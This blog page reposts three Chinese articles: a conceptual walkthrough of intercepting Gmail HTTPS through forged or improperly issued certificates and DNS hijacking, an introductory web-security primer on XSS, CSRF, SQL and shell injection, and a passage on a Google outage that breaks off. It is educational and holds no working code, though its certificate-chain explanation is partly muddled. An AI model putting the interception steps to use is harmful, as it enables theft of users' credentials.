
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 94 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/">破解Google Gmail的https新思路</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-google-gmail-https-">破解Google Gmail的https新思路</h1>
<p>最近，Google针对<a href="http://www.williamlong.info/archives/2053.html" target="_blank">Gmail被攻击事件</a>，全面默认启用了始终以https访问Gmail的方式了。但是，对于可以动用整个国家力量的黑客来说，从网络通讯数据中（在此不讨论对用户电脑种木马破解https的情况，只讨论在网络通讯数据中破解https的方法）破解https除了暴力破解（暴力破解https即使按照现在的集群计算能力仍旧需要几百至几万年不等）之外真的别无他法了吗？事实并非如此。</p>
<p>我们知道，https的安全性主要是由SSL证书中的公钥和私钥来保证的。浏览器与服务器经过https建立通讯的时候（不考虑SSL代理方式需要用户提交证书的情况，因为我们现在讨论的是浏览器访问网站，和SSL代理无关）会按照以下步骤保证通讯的安全性：</p>
<p>1、浏览器连接服务器，服务器把SSL证书的公钥发送给浏览器</p>
<p>2、浏览器验证此证书中的域是否和访问的域一致（比如用户访问<a href="https://mail.google.com/时，浏览器验证服务器发送过来的SSL证书的公钥中的域是否为mail.google.com或/*.google.com）并没有过期" target="_blank">https://mail.google.com/时，浏览器验证服务器发送过来的SSL证书的公钥中的域是否为mail.google.com或/*.google.com）并没有过期</a></p>
<p>3、如果浏览器验证失败，浏览器通知用户证书有问题，让用户选择是否继续</p>
<p>4、如果浏览器验证成功，那么浏览器随机生成一个对称密钥并使用接收到的SSL证书的公钥进行加密并发送给服务器</p>
<p>5、服务器通过SSL证书的私钥对收到的信息进行解密并得到浏览器随机生成的对称密钥</p>
<p>6、最后服务器和浏览器都通过这个对称密钥进行通讯了（为什么不直接使用公钥和私钥进行通讯？因为非对称加密比对称加密效率低）</p>
<p>这个方案看似完美，却无法抵御中间人攻击，攻击者可以按以下步骤实施攻击截取https通讯中的所有数据：</p>
<p>1、攻击者伪造一个Gmail的SSL证书，使其中的域为mail.google.com或/*.google.com，并设置合适的证书过期时间</p>
<p>2、攻击者等待访问者的浏览器访问Gmail时，通过DNS劫持或IP伪造（对于有路由器控制权限的黑客来说简直轻而易举）的方法使其访问到攻击者的服务器上</p>
<p>3、攻击者把伪造的SSL证书公钥发送给浏览器</p>
<p>4、浏览器验证SSL证书的域和过期时间都没错，认为访问到的就是Gmail本身，从而把对称密钥发送给黑客服务器</p>
<p>5、黑客服务器把伪造的Gmail网页通过收到的对称密钥加密后发送给浏览器</p>
<p>6、访问者通过浏览器输入Gmail帐户，发送给黑客服务器，黑客服务器通过收到的对称密钥解密后成功获得访问者的Gmail密码</p>
<p>为了抵御这种中间人攻击，SSL证书需要由可信的SSL证书颁发机构颁发，形成一个证书链（比如Gmail的证书链为：最底层为网域mail.google.com，上一层为Thawte SGC CA证书颁发机构，最顶层为很有名的VeriSign证书颁发机构）。那么，浏览器除了需要验证域和有效期外，还要检查证书链中的上级证书公钥是否有效，上级的上级证书公钥是否有效，直至根证书公钥为止。这样就可以有效避免中间人攻击了，因为根证书公钥都是预装在操作系统中的，黑客如果不是暴力破解，无法得到根证书的私钥，如果黑客自己生成一个私钥，浏览器验证根证书公钥的时候发现无法通过操作系统中预装的公钥加密数据后使用这个私钥进行解密，从而判定这个公钥是无效的。这个方案也是现在https通讯通常的方案。</p>
<p>那么，这个现在所有的浏览器正在使用的https通讯方案就无懈可击了吗？答案仍是否定的。我们可以看到，在后一个方案中，https的安全性需要在证书颁发机构公信力的强有力保障前提下才能发挥作用。如果证书颁发机构在没有验证黑客为mail.google.com的持游者的情况下，给黑客颁发了网域为mail.google.com的证书，那么黑客的中间人攻击又可以顺利实施：</p>
<p>1、攻击者从一家不验证mail.google.com持有者的SSL证书颁发机构WoSign那里得到了网域为mail.google.com的证书，此证书的证书链为：最底层为网域mail.google.com，上一层证书颁发机构为WoSign，顶层证书颁发机构为VeriSign</p>
<p>2/3、第二、第三个步骤同上一个方案的中间人攻击的第二、第三个步骤</p>
<p>4、浏览器验证SSL证书的域和过期时间都没错，继续验证证书链：</p>
<p>4.1、最底层的网域mail.google.com证书公钥不在操作系统中，无法验证其访问到的就是Gmail本身，继续验证上一层证书颁发机构</p>
<p>4.2、上一层证书颁发机构WoSign的公钥也不在操作系统中，仍旧无法验证其有效性，继续验证上一层证书颁发机构</p>
<p>4.3、浏览器看到顶层证书颁发机构VeriSign的公钥在操作系统中，认为证书链有效，从而把对称密钥发送给黑客服务器</p>
<p>5/6、第五、第六个步骤同上一个方案的中间人攻击的第五、第六个步骤。黑客成功获得访问者的Gmail密码</p>
<p>然而，不验证域名持有者就颁发证书的情况在国外几乎不会发生，但是在国内就不一定了。针对破解目标，国内证书颁发机构WoSign（在此只是举例国内比较有名的证书颁发机构WoSign，并不代表WoSign今后一定会这么做）很有可能为了上级要求颁发了证书给非域名持有者的黑客，从而使得破解目标的Gmail密码被黑客截取。</p>
<p>那么，国内的破解目标是不是使用https的Gmail也无法保证安全了呢？欢迎与我进行探讨。
来源： <a href="[http://www.williamlong.info/archives/2058.html](http://www.williamlong.info/archives/2058.html)">[http://www.williamlong.info/archives/2058.html](http://www.williamlong.info/archives/2058.html)</a> </p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--破解GoogleGmail的https新思路" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/">成为一个破坏者的第一部分：Web安全</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-web-">成为一个破坏者的第一部分：Web安全</h1>
<h2 id="-web-">成为一个破坏者的第一部分：Web安全</h2>
<p>在我看来，没有什么比挑战安全领域更有挑战性。当强大的软件一个接一个接踵而至，你所需要做的就是破解他，这好比是一场围棋游戏。当你每下一步棋，你的对手——软件的设计者和开发者，通过代理——作出相应的回应。正如你所知的，赢的途径只有一条，你将会利用大脑的每一部分，找出链条中的弱点。</p>
<p>当我找到正确的击破点，并且整个系统崩溃的时候，我觉得我找到了自己。你也会的。</p>
<h2 id="-">序言</h2>
<p>这篇博客的目的并不是要全面地去讨论；实际上，它是相反的。我的目的是教会你关于安全上足够的东西——尤其是软件安全——你可以自己去深入学习其他东西。为了轻松去学习，我会在通篇博客中放置各种资源的链接；在这里，Google也是你最好的朋友，它在这个主题上有上百万的资源。</p>
<p>在你读了正文部分后，你可以跳去其他的你认为合适的任何部分（包括其他由之而来的博客），因为它们是独立编写的。</p>
<p>这篇博客主要关注Web安全。对于底层安全和加密的博客即将发布。</p>
<h2 id="-">正文</h2>
<h3 id="-">预备知识</h3>
<p>要想出一些安全领域的预备知识是比较难的，这知识由于这领域的涉及面太广。然而，下面的东西还是必需要有的：</p>
<ul>
<li>熟悉一种或多种编程语言（没有人会让你用你不会的语言来写小说）。如果你感兴趣的是底层的安全，那就必需要会一种底层语言；C是最好的。</li>
<li><p>了解计算机的原理和它是怎样工作的。不要求你能够用铁罐和线组装层一个CPU，但你要能够解析：</p>
</li>
<li><p>(Web) HTML是怎样转换的以及JS是怎样在页面上交互的。</p>
</li>
<li><p>(Web) HTTP协议是怎样工作的。</p>
</li>
<li><p>实际上，写一个代理。你最后就做了很多这些东西。（这实际上是足够重要的，某天我可能会写一个关于这个的博客。）</p>
</li>
<li>(底层) 指针是怎样工作的，栈是怎样布局的，堆是什么东西，以及（附加要点）系统调用是怎样工作的。</li>
</ul>
<p>在需要的地方，我会讲下更多的特殊预备知识。</p>
<h2 id="-">心态</h2>
<p>在我继续之前，我需要触摸一下破坏者的心态。你的目标并不是保存用户交互，或是程序的数据流。你的目标是回答一个简单的问题：在什么情况下，程序无法完成其既定目标？</p>
<p>或许对此最好的例子就是网络应用中存在的跨站脚本攻击；攻击者可以在页面之外输出未经过滤的内容，允许其在页面中插入任意的HTML代码。正常的数据流存留——从用户到页面的数据——但由于数据中含有HTML代码，页面被完全损坏了》</p>
<p>预期和实际行为的区别在于你对所有可能性的探寻——无论是下节中描述的标准bug，还是你正测试的问题域的特有逻辑缺陷。</p>
<h2 id="-">网络安全</h2>
<h3 id="-">必用工具</h3>
<p>下面是一个你的兵器库中必备工具的列表。其中一些是很多工具的集合——除非特别提及，它们大多是可以相互替换的。</p>
<ul>
<li><p>HTTP(S) 代理——你会经常用到，它将允许你在传输过程中分行和修改数据。</p>
</li>
<li><p><a href="http://portswigger.net/burp/proxy.html" target="_blank">Burp 代理</a>——除非有理由，否则你值得拥有。这是业内标准，学习曲线很浅。</p>
</li>
<li><a href="http://mitmproxy.org/" target="_blank">mitmproxy</a></li>
<li><a href="http://www.charlesproxy.com/" target="_blank">Charles 代理</a> (界面非常糟糕，只在对 <a href="http://en.wikipedia.org/wiki/Action_Message_Format" target="_blank">AMF</a> 时使用它。)</li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank">DirBuster</a> —— 对查找“隐藏”的文件/目录很有用。</li>
<li><a href="https://github.com/GDSSecurity/PadBuster" target="_blank">PadBuster</a> —— 侦查填充溢出漏洞很有用。</li>
<li><a href="http://python.org/" target="_blank">Python</a> or <a href="http://ruby-lang.org/" target="_blank">Ruby</a> —— 对任务进行自动化处理。</li>
</ul>
<h2 id="-"> </h2>
<h2 id="-xss-">跨站脚本漏洞（XSS）</h2>
<p>跨站脚本是网站最常见的漏洞。这个概念很简单：攻击者的数据发送到页面没有经过合适的过滤，使攻击者的代码可以在页面上下文内执行。</p>
<p>反射XSS（Reflected XSS）是攻击者的注入（比如查询字符串）后页面直接显示攻击结果。这是最常用的也是使用最多的CSRF攻击方式（见下一节）。他们可以被许多现代Web框架默认防御掉。</p>
<p>存储XSS（Stored XSS）是攻击者把数据注入到存储单元中——一般是数据库——在此后的某个时段无过滤的输出结果。这种XSS没有反射XSS普遍，但是杀伤力更大，因为很容易影响到大量用户。和反射XSS一样，许多框架默认也可以防御。</p>
<p>基于DOM的XSS（DOM-based XSS）是注入到JavaScript中，浏览器无过滤的输出结果。这种XSS相当罕见但是无法被框架防御。因而相对别的XSS形式，基于DOM的XSS在逐渐增多。</p>
<p>在所有情况下，他们都可以被输出前的数据过滤阻止，但重要的是正确地编码数据。例如HTML编码没办法防御数据中script标签中的代码；这样JS字符串也需要编码。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A2-Cross-Site_Scripting_%28XSS%29" target="_blank">OWASP</a> (The Open Web Application Security Project)</li>
<li><a href="http://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank">Wikipedia</a><h2 id="-csrf-">跨站请求伪造（CSRF）</h2>
</li>
</ul>
<p>CSRF攻击很简单，但很常见很有效。基本的原理是攻击者把受害者引导（重定向或Email中的链接）到目标网站上。这个页面带有执行请求的数据，比如银行事务。从后端看，就像是用户自己做的一个正常的请求。</p>
<p>防御CSRF的方法是在表单数据中加入随机令牌（token）。每次请求后端都验证token，确定用户会话token和表单数据token相同，否则拒绝请求。尽管主流框架都内置CSRF防御，但CSRF仍然是常见的攻击方式。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A5" target="_blank">OWASP</a></li>
<li><a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery" target="_blank">Wikipedia</a></li>
</ul>
<h2 id="sql-">SQL注入</h2>
<p>SQL注入是目前Web应用中最著名最普遍的漏洞。它是利用SQL查询时没有合适的转义，攻击者可以阻断原有查询并添加自己的查询代码。</p>
<p>根据代码和数据库配置情况，他可以造成从较大（盲注入查询数据）到在灾难级（任意代码执行，文件访问权限和数据破坏等）的破坏。主流的框架使用自带的ORM防御SQL注入：所有都用预备参数查询。当原生查询和攻击数据混合时，必须进行合适的转义。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A1" target="_blank">OWASP</a></li>
<li><a href="http://en.wikipedia.org/wiki/SQL_injection" target="_blank">Wikipedia</a><h2 id="shell-">Shell注入</h2>
</li>
</ul>
<p>Shell注入非常罕见，但非常严重。如果用户无过滤的传递shell命令，有可能——通过引号，分号或其他符号——同时执行其他命令。</p>
<p>使用用户数据调用shell命令最好把命令打包数组里（这是自然免疫）提供给程序，而且对原始命令字符串拼接的命令恰当的转义。</p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Code_injection#Shell_injection" target="_blank">Wikipedia</a></li>
</ul>
<h2 id="-">目录遍历</h2>
<p>目录遍历通常用于将用户信息直接指向系统中文件路径的情形。这样，如果没有适当的过滤，可能插入一个 “..” 目录的引用，就可以查阅目录树。它可能允许任意的读/写/删除文件操作，这是一个非常常见的漏洞。</p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Directory_traversal_attack" target="_blank">Wikipedia</a><h2 id="-">授权不足</h2>
</li>
</ul>
<p>授权不足 指的是某些功能或数据没有设定访问控制的情形。有个例子，一个正确设定访问控制的管理控制台有一个对有管理员身份需求的功能的链接，而此功能本身并未正确的设置访问控制。</p>
<p>这通常用于强制浏览攻击，以非法控制数据。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A8" target="_blank">OWASP</a></li>
</ul>
<h2 id="-">强制浏览</h2>
<p>强制浏览——又叫 直接对象引用——是一种嫁给你实现细节以可修改的方式暴露给用户的漏洞类型。通常，它的形式是在请求中出现一个可以很容易修改的 id 参数，使攻击者可以轻易的列举出可能的标识符，以访问和修改数据。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A4" target="_blank">OWASP</a></li>
</ul>
<h2 id="-">其它</h2>
<p>上面的话题是一个很好的开始，它们是我在测试现实世界中的应用时，<em>不断</em>出现的东西。当然，我给出的列表并不全面，所以下面列出了一些其它的主题，你应该读一下：</p>
<ul>
<li><a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank">XML外部实体注入 (XXE)</a></li>
<li><a href="http://en.wikipedia.org/wiki/Session_fixation" target="_blank">Session 固化</a></li>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" target="_blank">无校验重定向</a><h2 id="-">联系</h2>
</li>
</ul>
<p>处于对 <a href="http://www.overthewire.org/wargames/natas/" target="_blank">Natas</a> 网络安全的兴趣，我在近期指点了很多人。在这网络游戏中，你将使用到很多我在本文中提到过得技术，还有一些技术我并没有提及。它们也很有趣。</p>
<p>其它优质资源：</p>
<ul>
<li><a href="https://github.com/stripe-ctf/stripe-ctf-2.0/" target="_blank">Stripe CTF 2.0</a></li>
<li>OWASP&#39;s <a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project" target="_blank">WebGoat</a> and <a href="https://www.owasp.org/index.php/Category:OWASP_Vicnum_Project" target="_blank">Vicnum</a></li>
<li>Maven&#39;s <a href="http://www.mavensecurity.com/web_security_dojo/" target="_blank">Web Security Dojo</a></li>
<li><a href="http://peruggia.sourceforge.net/" target="_blank">Peruggia</a></li>
</ul>
<h2 id="-">深入学习</h2>
<p>希望完成练习并深入到实际应用中去？现在，很多公司都有 Bug 奖励系统，这样你不仅可以合法的测试它们的软件，同时还可以由自己发现的 Bug 获取报酬。你可以在 <a href="http://blog.bugcrowd.com/list-of-active-bug-bounty-programs/" target="_blank">这里</a>找到这些软件的列表。
Happy hacking,</p>
<p>时间:2013-03-19 08:47来源:开源中国社区 作者:oschina责任编辑:陈华才</p>
<p>来源： <a href="[http://www.linuxeden.com/html/news/20130319/137120.html](http://www.linuxeden.com/html/news/20130319/137120.html)">[http://www.linuxeden.com/html/news/20130319/137120.html](http://www.linuxeden.com/html/news/20130319/137120.html)</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--成为一个破坏者的第一部分：Web安全" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/">从谷歌宕机事件认识互联网工作原理</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-csdn-net">从谷歌宕机事件认识互联网工作原理-CSDN.NET</h1>
<p>您还未登录！|<a href="https://passport.csdn.net/account/login" target="_blank">登录</a>|<a href="https://passport.csdn.net/account/register" target="_blank">注册</a>|<a href="https://passport.csdn.net/help/faq" target="_blank">帮助</a></p>
<ul>
<li><a href="http://www.csdn.net/" target="_blank">首页</a></li>
<li><a href="http://news.csdn.net/" target="_blank">业界</a></li>
<li><a href="http://mobile.csdn.net/" target="_blank">移动</a></li>
<li><a href="http://cloud.csdn.net/" target="_blank">云计算</a></li>
<li><a href="http://sd.csdn.net/" target="_blank">研发</a></li>
<li><a href="http://bbs.csdn.net/" target="_blank">论坛</a></li>
<li><a href="http://blog.csdn.net/" target="_blank">博客</a></li>
<li><a href="http://download.csdn.net/" target="_blank">下载</a></li>
<li><h2 id="-"><a href="">更多</a></h2>
</li>
</ul>
<p><a href="http://www.csdn.net/" title="CSDN内容中心"></a></p>
<ul>
<li><a href="http://news.csdn.net/" target="_blank">业界</a></li>
<li><a href="http://mobile.csdn.net/" target="_blank">移动开发</a></li>
<li><a href="http://cloud.csdn.net/" target="_blank">云计算</a></li>
<li><a href="http://sd.csdn.net/" target="_blank">软件研发</a></li>
<li><a href="http://special.csdn.net/newssubject/index.html" target="_blank">专题</a></li>
<li><p><a href="http://www.programmer.com.cn/" target="_blank">程序员杂志</a></p>
</li>
<li><p><a href="http://www.csdn.net/article/tag/%E4%BA%A7%E5%93%81" target="_blank">产品</a></p>
</li>
<li><a href="http://www.csdn.net/article/tag/%E5%88%9B%E4%B8%9A" target="_blank">创业</a></li>
<li><a href="http://www.csdn.net/article/tag/%E8%81%8C%E5%9C%BA" target="_blank">职场</a></li>
<li><a href="http://www.csdn.net/article/tag/%E4%BA%BA%E7%89%A9" target="_blank">人物</a></li>
<li><a href="http://www.csdn.net/article/tag/%E8%AE%BE%E8%AE%A1" target="_blank">设计</a></li>
<li><p><a href="http://www.csdn.net/article/tag/%E5%BC%80%E6%BA%90" target="_blank">开源</a></p>
</li>
<li><p><a href="http://www.csdn.net/article/tag/ios" target="_blank">iOS</a></p>
</li>
<li><a href="http://www.csdn.net/article/tag/android" target="_blank">Android</a></li>
<li><a href="http://www.csdn.net/article/tag/windowsphone" target="_blank">WindowsPhone</a></li>
<li><a href="http://www.csdn.net/article/tag/html5" target="_blank">HTML5</a></li>
<li><a href="http://www.csdn.net/article/tag/rim" target="_blank">RIM</a></li>
<li><a href="http://www.csdn.net/article/tag/top30" target="_blank">TOP30</a></li>
<li><a href="http://www.csdn.net/article/tag/cmdn" target="_blank">CMDN</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83" target="_blank">数据中心</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank">服务器</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%AD%98%E5%82%A8" target="_blank">存储</a></li>
<li><a href="http://www.csdn.net/article/tag/%E8%99%9A%E6%8B%9F%E5%8C%96" target="_blank">虚拟化</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%A4%A7%E6%95%B0%E6%8D%AE" target="_blank">大数据</a></li>
<li><a href="http://www.csdn.net/article/tag/nosql" target="_blank">NoSQL</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0" target="_blank">开放平台</a></li>
<li><p><a href="http://www.csdn.net/article/tag/%E5%AE%89%E5%85%A8" target="_blank">安全</a></p>
</li>
<li><p><a href="http://www.csdn.net/article/tag/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80" target="_blank">编程语言</a></p>
</li>
<li><a href="http://www.csdn.net/article/tag/%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0" target="_blank">开放平台</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91" target="_blank">前端开发</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95" target="_blank">智能算法</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%9E%B6%E6%9E%84" target="_blank">架构</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank">数据库</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%B5%8C%E5%85%A5%E5%BC%8F" target="_blank">嵌入式</a>
<a href="http://news.csdn.net/rss_sd.html" target="_blank">订阅软件研发RSS</a> <a href="http://www.csdn.net/" target="_blank">CSDN首页</a><em>&gt;</em> <a href="http://sd.csdn.net/" target="_blank">软件研发</a></li>
</ul>
<h1 id="-">从谷歌宕机事件认识互联网工作原理</h1>
<h3 id="-3-1205-it-2-">发表于3小时前| 1205次阅读| 来源外刊IT评论| 2 条评论| 作者佚名</h3>
<p><a href="http://www.csdn.net/article/tag/%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank">服务器</a><a href="http://www.csdn.net/article/tag/%E8%B0%B7%E6%AD%8C" target="_blank">谷歌</a><a href="http://www.csdn.net/article/tag/%E6%B3%84%E9%9C%B2" target="_blank">泄露</a><a href="http://www.csdn.net/article/tag/%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95" target="_blank">智能算法</a><a href="http://www.csdn.net/article/tag/%E4%BA%92%E8%81%94%E7%BD%91" target="_blank">互联网</a></p>
<p><strong>摘要：</strong>谷歌服务器经历了短暂的宕机事件，持续大概27分钟，对部分地区的互联网用户造成了影响。此次事件的原因深究起来需要进入互联网络那深邃的、黑暗的角落。
<strong>译者注：本文中提到CloudFlare是一家总部位于美国旧金山的内容分发网络(CDN)服务公司，由Project Honey Pot项目的三位前开发人员成立于2009年。2011年10月被华尔街日报评为最具创新精神的网络科技公司。</strong></p>
<p>今天，谷歌服务器经历了短暂的宕机事件，持续大概27分钟，对部分地区的互联网用户造成了影响。此次事件的原因深究起来需要进入互联网络那深邃的、黑暗的角落。我是CloudFlare公司的一名网络工程师，在帮助谷歌从此次宕机中恢复回来提供了一臂之力。下面就是事情发生的过程。</p>
<p>大约在太平洋标准时间2012年11月5号下午6：24分/时间标准时间2012年11月6号凌晨2：24分，CloudFlare的员工发现谷歌的服务中断了。我们使用谷歌的电子邮件等服务，所以，当它的服务不正常时，办公室的人会很快发现。我在网络技术小组工作，因此我立刻接上网络查看是什么情况——是局部区域问题还是全球问题。</p>
<p><strong>问题排查</strong></p>
<p>我很快就意识到，所有谷歌的服务我们都不能连接上——甚至包括连接 8.8.8.8，谷歌的公共DNS服务器——于是，我从追查DNS开始。</p>
<ol>
<li>dig +trace google.com </li>
</ol>
<p>下面是我在探测Google.com的域名服务器时得到的回复：</p>
<p>google.com. 172800 IN NS ns2.google.com.</p>
<p>google.com. 172800 IN NS ns1.google.com.</p>
<p>google.com. 172800 IN NS ns3.google.com.</p>
<p>google.com. 172800 IN NS ns4.google.com.</p>
<p>;; Received 164 bytes from 192.12.94.30/#53(e.gtld-servers.net) in 152 ms</p>
<p>;; connection timed out; no servers could be reached</p>
<p>无法探测到任何服务器的结果证明确实有什么地方出了问题。尤其是，这意味着从我们的办公室将连接不到任何的谷歌DNS服务器。</p>
